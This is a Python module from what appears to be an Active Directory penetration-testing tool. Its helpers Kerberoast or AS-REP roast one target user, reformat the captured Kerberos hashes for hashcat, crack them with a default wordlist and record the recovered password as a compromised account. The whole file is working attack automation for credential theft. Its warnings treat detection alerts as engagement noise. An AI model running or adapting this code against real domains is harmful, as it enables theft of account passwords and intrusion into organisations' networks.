"""Per-user Kerberoast/ASREPRoast execution helpers.

These helpers are designed for attack-path execution, where we want to:
- target a specific user (from an attack path step)
- avoid the interactive "recommended/all/specific" roasting UX
- reuse existing cracking + attack_graph updates

The regular interactive CLI commands (`kerberoast`, `asreproast`) remain unchanged.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Any
import os
import re

from adscan_internal import (
    print_error,
    print_info,
    print_info_debug,
    print_warning,
    telemetry,
)
from adscan_internal.cli.ace_step_execution import set_last_execution_outcome
from adscan_internal.cli import cracking as cracking_cli
from adscan_internal.path_utils import get_adscan_home
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services import EnumerationService
from adscan_internal.services.attack_graph_service import upsert_roast_entry_edge
from adscan_internal.workspaces import domain_relpath, domain_subpath


@dataclass(frozen=True)
class _AuthCredential:
    username: str
    secret: str
    is_hash: bool


def _select_any_domain_credential(shell: Any, domain: str) -> _AuthCredential | None:
    """Select a usable domain credential for authenticated roasting.

    Prefers the domain-scoped `username/password` if present; otherwise falls
    back to the first credential in `domains_data[domain]["credentials"]`.
    """
    domains_data = getattr(shell, "domains_data", None)
    if not isinstance(domains_data, dict):
        return None
    domain_data = domains_data.get(domain)
    if not isinstance(domain_data, dict):
        return None

    username = str(domain_data.get("username") or "").strip()
    password = str(domain_data.get("password") or "").strip()
    if username and password:
        return _AuthCredential(username=username, secret=password, is_hash=False)

    creds = domain_data.get("credentials")
    if not isinstance(creds, dict) or not creds:
        return None

    # Prefer a plaintext-looking entry, but accept hashes too.
    for candidate_user, candidate_secret in creds.items():
        user = str(candidate_user or "").strip()
        secret = str(candidate_secret or "").strip()
        if not user or not secret:
            continue
        is_hash = len(secret) == 32 and all(
            c in "0123456789abcdef" for c in secret.lower()
        )
        return _AuthCredential(username=user, secret=secret, is_hash=is_hash)

    return None


def _has_domain_credential(shell: Any, domain: str, username: str) -> bool:
    domains_data = getattr(shell, "domains_data", None)
    if not isinstance(domains_data, dict):
        return False
    domain_data = domains_data.get(domain)
    if not isinstance(domain_data, dict):
        return False
    creds = domain_data.get("credentials")
    if not isinstance(creds, dict):
        return False
    for user, secret in creds.items():
        if (
            str(user or "").strip().lower() == (username or "").strip().lower()
            and isinstance(secret, str)
            and secret
        ):
            return True
    return False


def _get_domain_credential(shell: Any, domain: str, username: str) -> str | None:
    """Return a stored credential for a domain user using case-insensitive matching."""
    domains_data = getattr(shell, "domains_data", None)
    if not isinstance(domains_data, dict):
        return None
    domain_data = domains_data.get(domain)
    if not isinstance(domain_data, dict):
        return None
    creds = domain_data.get("credentials")
    if not isinstance(creds, dict):
        return None
    target_normalized = str(username or "").strip().lower()
    if not target_normalized:
        return None
    for stored_user, stored_credential in creds.items():
        if str(stored_user or "").strip().lower() != target_normalized:
            continue
        candidate = str(stored_credential or "").strip()
        return candidate or None
    return None


def _record_user_credential_outcome(
    shell: Any,
    *,
    domain: str,
    target_user: str,
) -> None:
    """Store a runtime outcome when roasting recovers a usable credential."""
    credential = _get_domain_credential(shell, domain, target_user)
    marked_user = mark_sensitive(target_user, "user")
    marked_domain = mark_sensitive(domain, "domain")
    if not credential:
        print_info_debug(
            "[roasting-exec] no stored credential available for post-roast follow-up: "
            f"user={marked_user} domain={marked_domain}"
        )
        return

    credential_type = (
        "hash"
        if len(credential) == 32
        and all(char in "0123456789abcdef" for char in credential.lower())
        else "password"
    )
    set_last_execution_outcome(
        shell,
        {
            "key": "user_credential_obtained",
            "domain": domain,
            "target_domain": domain,
            "compromised_user": target_user,
            "credential": credential,
            "credential_type": credential_type,
        },
    )
    print_info_debug(
        "[roasting-exec] recorded credential outcome after roasting: "
        f"user={marked_user} domain={marked_domain} type={credential_type}"
    )


def _ensure_cracking_dir(shell: Any, domain: str) -> tuple[str, str]:
    workspace_cwd = shell._get_workspace_cwd()
    cracking_dir = getattr(shell, "cracking_dir", "cracking")
    rel = domain_relpath(shell.domains_dir, domain, cracking_dir)
    abs_path = domain_subpath(workspace_cwd, shell.domains_dir, domain, cracking_dir)
    os.makedirs(abs_path, exist_ok=True)
    return rel, abs_path


def _resolve_workspace_dir(shell: Any) -> str:
    """Return the active workspace directory for roasting helpers.

    Some unit-test shells only expose `_get_workspace_cwd()` and do not define
    `current_workspace_dir`. Runtime shells usually expose both. This helper
    keeps the Impacket context tolerant to either shape.
    """
    workspace_dir = str(getattr(shell, "current_workspace_dir", "") or "").strip()
    if workspace_dir:
        return workspace_dir
    return str(shell._get_workspace_cwd())


def _normalize_hashes_file_for_hashcat(
    *,
    hashes_file_abs: str,
    target_user: str,
) -> str:
    """Normalize an Impacket output file into `username:<hash>` single-line format.

    Some Impacket outputs (or intermediary tooling) can leave hashes split across
    multiple lines, which `hashcat` can't parse. Our cracking pipeline also uses
    `--username`, so we ensure a stable `username:<hash>` format.

    Args:
        hashes_file_abs: Absolute path to the (possibly raw) hashes file.
        target_user: Username to prefix for `--username` mode.

    Returns:
        Absolute path to the normalized file (may be the original path).
    """
    if not os.path.exists(hashes_file_abs):
        return hashes_file_abs

    try:
        raw = Path(hashes_file_abs).read_text(encoding="utf-8", errors="ignore")
    except OSError:
        return hashes_file_abs

    lines = [ln.strip() for ln in raw.splitlines() if ln.strip()]
    if not lines:
        return hashes_file_abs

    def _is_username_prefixed_hash(line: str) -> bool:
        # Our cracking pipeline uses `hashcat --username`, so we normalize to:
        #   <username>:$krb5...
        # Note: raw ASREPRoast hashes include an internal ":" (after the realm),
        # so we must only treat lines as "already normalized" when they start
        # with "<user>:$krb5".
        return bool(re.match(r"^[^:]+:\$krb5", line or ""))

    def _hash_user(line: str) -> str | None:
        """Return the username encoded inside a roast hash line.

        Supported shapes:
        - `user:$krb5...`               (already prefixed for `--username`)
        - `$krb5tgs$<etype>$*user$REALM$spn*$...`   (TGS-REP / Kerberoasting)
        - `$krb5asrep$<etype>$user@REALM:...`       (AS-REP Roasting)
        """
        if not line:
            return None
        m = re.match(r"^([^:$]+):\$krb5", line)
        if m:
            return m.group(1).strip().lower() or None
        m = re.match(r"^\$krb5tgs\$\d+\$\*([^$]+)\$", line)
        if m:
            return m.group(1).strip().lower() or None
        m = re.match(r"^\$krb5asrep\$\d+\$([^@]+)@", line)
        if m:
            return m.group(1).strip().lower() or None
        return None

    def _extract_hash_payload() -> str | None:
        """Pick the hash line whose embedded user matches `target_user`.

        The native roaster writes one hash per discovered SPN-bearing user into
        the same file, so we must select the line that belongs to the user we
        are about to crack — concatenating all of them would produce a single
        malformed token that `hashcat` rejects.
        """
        wanted = (target_user or "").strip().lower()
        first_marker_line: str | None = None
        for line in lines:
            if "$krb5" not in line:
                continue
            if first_marker_line is None:
                first_marker_line = line
            owner = _hash_user(line)
            if owner and wanted and owner == wanted:
                hash_start = line.find("$krb5")
                payload = line[hash_start:].strip() if hash_start > 0 else line.strip()
                if _is_username_prefixed_hash(line):
                    return line.strip()
                return payload or None

        # Fallback: no per-user match (single-hash file written by older paths).
        # Use the first marker line as-is.
        if first_marker_line is None:
            return None
        hash_start = first_marker_line.find("$krb5")
        if _is_username_prefixed_hash(first_marker_line):
            return first_marker_line.strip()
        return first_marker_line[hash_start:].strip() if hash_start >= 0 else None

    # If already in `<user>:$krb5...` form *and* single-line, keep it as-is.
    first = lines[0]
    if len(lines) == 1 and _is_username_prefixed_hash(first):
        print_info_debug(
            "[roasting-exec] hash file already normalized for hashcat: "
            f"file={mark_sensitive(hashes_file_abs, 'path')}"
        )
        return hashes_file_abs

    extracted = _extract_hash_payload()
    if not extracted:
        print_info_debug(
            "[roasting-exec] unable to find a Kerberos roast hash marker in file: "
            f"file={mark_sensitive(hashes_file_abs, 'path')} lines={len(lines)}"
        )
        return hashes_file_abs

    normalized_line = (
        extracted
        if _is_username_prefixed_hash(extracted)
        else f"{target_user}:{extracted}"
    )
    normalized_path = f"{hashes_file_abs}.hashcat"
    try:
        Path(normalized_path).write_text(normalized_line + "\n", encoding="utf-8")
    except OSError:
        return hashes_file_abs
    print_info_debug(
        "[roasting-exec] normalized Kerberos roast hash file for hashcat: "
        f"source={mark_sensitive(hashes_file_abs, 'path')} "
        f"target={mark_sensitive(normalized_path, 'path')} "
        f"input_lines={len(lines)} already_prefixed={_is_username_prefixed_hash(extracted)}"
    )
    return normalized_path


def run_kerberoast_for_user(
    shell: Any,
    domain: str,
    *,
    target_user: str,
    wordlists_dir: str | None = None,
) -> bool:
    """Run Kerberoasting for a single target user and crack the result.

    Returns:
        True if the target credential was recovered (stored), False otherwise.
    """
    target_user = str(target_user or "").strip()
    if not target_user:
        print_warning("Kerberoast target user is missing.")
        return False

    auth = _select_any_domain_credential(shell, domain)
    if not auth:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"Cannot Kerberoast without an authenticated domain credential. Domain: {marked_domain}"
        )
        return False

    print_warning(
        "Kerberoasting requests RC4 tickets (etype 23) — preferred for offline cracking speed. "
        "Microsoft Defender for Identity generates alert 'Kerberoasting attack suspected' "
        "(Event 4769, Ticket Encryption Type 0x17). Document as expected engagement noise."
    )

    upsert_roast_entry_edge(
        shell,
        domain,
        roast_type="kerberoast",
        username=target_user,
        status="discovered",
    )

    _, cracking_abs_dir = _ensure_cracking_dir(shell, domain)
    safe_suffix = target_user.replace("/", "_").replace("\\", "_").replace(" ", "_")
    hashes_file_abs = str(Path(cracking_abs_dir) / f"hashes.kerberoast.{safe_suffix}")
    usersfile_abs = str(Path(cracking_abs_dir) / f"users.kerberoast.{safe_suffix}.txt")
    try:
        Path(usersfile_abs).write_text(f"{target_user}\n", encoding="utf-8")
    except OSError as exc:
        telemetry.capture_exception(exc)
        marked_path = mark_sensitive(usersfile_abs, "path")
        print_error(f"Failed to write users file for Kerberoast: {marked_path}")
        return False

    enum_service = EnumerationService(license_mode=shell._get_license_mode_enum())

    try:
        enum_service.kerberos.kerberoast(
            domain=domain,
            pdc=shell.domains_data[domain]["pdc"],
            username=auth.username,
            password=None if auth.is_hash else auth.secret,
            hashes=auth.secret if auth.is_hash else None,
            auth_domain=domain,
            output_file=Path(hashes_file_abs),
            usersfile=Path(usersfile_abs),
            workspace_dir=_resolve_workspace_dir(shell),
            domains_data=getattr(shell, "domains_data", {}),
            sync_clock=getattr(shell, "sync_clock_with_pdc", None),
            scan_id=None,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        marked_user = mark_sensitive(target_user, "user")
        print_error(f"Kerberoast failed for {marked_user}.")
        return False

    if not os.path.exists(hashes_file_abs):
        marked_user = mark_sensitive(target_user, "user")
        print_warning(f"No Kerberoast hashes produced for {marked_user}.")
        return False

    hashes_file_for_cracking = _normalize_hashes_file_for_hashcat(
        hashes_file_abs=hashes_file_abs,
        target_user=target_user,
    )
    print_info_debug(
        "[roasting-exec] Kerberoast cracking input prepared: "
        f"user={mark_sensitive(target_user, 'user')} "
        f"raw_file={mark_sensitive(hashes_file_abs, 'path')} "
        f"cracking_file={mark_sensitive(hashes_file_for_cracking, 'path')}"
    )

    if not wordlists_dir:
        wordlists_dir = str(get_adscan_home() / "wordlists")

    # Crack (non-interactive default = rockyou).
    print_info(
        f"Attempting to crack Kerberoast hash for {mark_sensitive(target_user, 'user')}..."
    )
    cracking_cli.run_cracking(
        shell,
        hash_type="kerberoast",
        domain=domain,
        hash_file=hashes_file_for_cracking,
        wordlists_dir=wordlists_dir,
        failed=False,
    )
    recovered = _has_domain_credential(shell, domain, target_user)
    if recovered:
        _record_user_credential_outcome(shell, domain=domain, target_user=target_user)
    return recovered


def run_asreproast_for_user(
    shell: Any,
    domain: str,
    *,
    target_user: str,
    wordlists_dir: str | None = None,
) -> bool:
    """Run ASREPRoasting for a single target user and crack the result.

    Returns:
        True if the target credential was recovered (stored), False otherwise.
    """
    target_user = str(target_user or "").strip()
    if not target_user:
        print_warning("ASREPRoast target user is missing.")
        return False

    print_warning(
        "AS-REP Roasting requests pre-auth disabled TGTs. "
        "Microsoft Defender for Identity generates alert 'AS-REP Roasting attack suspected' "
        "(Event 4768, Pre-Authentication Type 0). Document as expected engagement noise."
    )

    upsert_roast_entry_edge(
        shell,
        domain,
        roast_type="asreproast",
        username=target_user,
        status="discovered",
    )

    _, cracking_abs_dir = _ensure_cracking_dir(shell, domain)
    safe_suffix = target_user.replace("/", "_").replace("\\", "_").replace(" ", "_")
    hashes_file_abs = str(Path(cracking_abs_dir) / f"hashes.asreproast.{safe_suffix}")
    usersfile_abs = str(Path(cracking_abs_dir) / f"users.asreproast.{safe_suffix}.txt")
    try:
        Path(usersfile_abs).write_text(f"{target_user}\n", encoding="utf-8")
    except OSError as exc:
        telemetry.capture_exception(exc)
        marked_path = mark_sensitive(usersfile_abs, "path")
        print_error(f"Failed to write users file for ASREPRoast: {marked_path}")
        return False

    enum_service = EnumerationService(license_mode=shell._get_license_mode_enum())

    try:
        enum_service.kerberos.asreproast(
            domain=domain,
            pdc=shell.domains_data[domain]["pdc"],
            usersfile=Path(usersfile_abs),
            output_file=Path(hashes_file_abs),
            workspace_dir=_resolve_workspace_dir(shell),
            domains_data=getattr(shell, "domains_data", {}),
            sync_clock=getattr(shell, "sync_clock_with_pdc", None),
            scan_id=None,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        marked_user = mark_sensitive(target_user, "user")
        print_error(f"ASREPRoast failed for {marked_user}.")
        return False

    if not os.path.exists(hashes_file_abs):
        marked_user = mark_sensitive(target_user, "user")
        print_warning(f"No ASREPRoast hashes produced for {marked_user}.")
        return False

    hashes_file_for_cracking = _normalize_hashes_file_for_hashcat(
        hashes_file_abs=hashes_file_abs,
        target_user=target_user,
    )
    print_info_debug(
        "[roasting-exec] ASREPRoast cracking input prepared: "
        f"user={mark_sensitive(target_user, 'user')} "
        f"raw_file={mark_sensitive(hashes_file_abs, 'path')} "
        f"cracking_file={mark_sensitive(hashes_file_for_cracking, 'path')}"
    )

    if not wordlists_dir:
        wordlists_dir = str(get_adscan_home() / "wordlists")

    print_info(
        f"Attempting to crack ASREPRoast hash for {mark_sensitive(target_user, 'user')}..."
    )
    cracking_cli.run_cracking(
        shell,
        hash_type="asreproast",
        domain=domain,
        hash_file=hashes_file_for_cracking,
        wordlists_dir=wordlists_dir,
        failed=False,
    )
    recovered = _has_domain_credential(shell, domain, target_user)
    if recovered:
        _record_user_credential_outcome(shell, domain=domain, target_user=target_user)
    return recovered
